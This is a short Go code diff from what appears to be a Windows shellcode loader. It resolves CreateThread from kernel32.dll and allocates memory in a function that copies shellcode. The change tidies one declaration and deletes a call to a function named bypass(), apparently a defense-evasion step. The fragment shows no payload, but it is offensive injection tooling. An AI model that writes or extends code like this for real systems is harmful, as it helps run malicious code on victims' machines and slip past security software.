@@ -25,7 +25,8 @@ const (
 )
 
 var (
-	modKernel32      = windows.NewLazySystemDLL("kernel32.dll")
+	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
+
 	procCreateThread = modKernel32.NewProc("CreateThread")
 )
 
@@ -53,7 +54,6 @@ func VirtualProtect(shellcode []byte) error {
 	}
 
 	// allocate memory and copy shellcode
-	bypass()
 	memAddr, err := windows.VirtualAlloc(0, uintptr(l), memReserve|memCommit, pageReadWrite)
 	if err != nil {
 		return errors.WithStack(err)
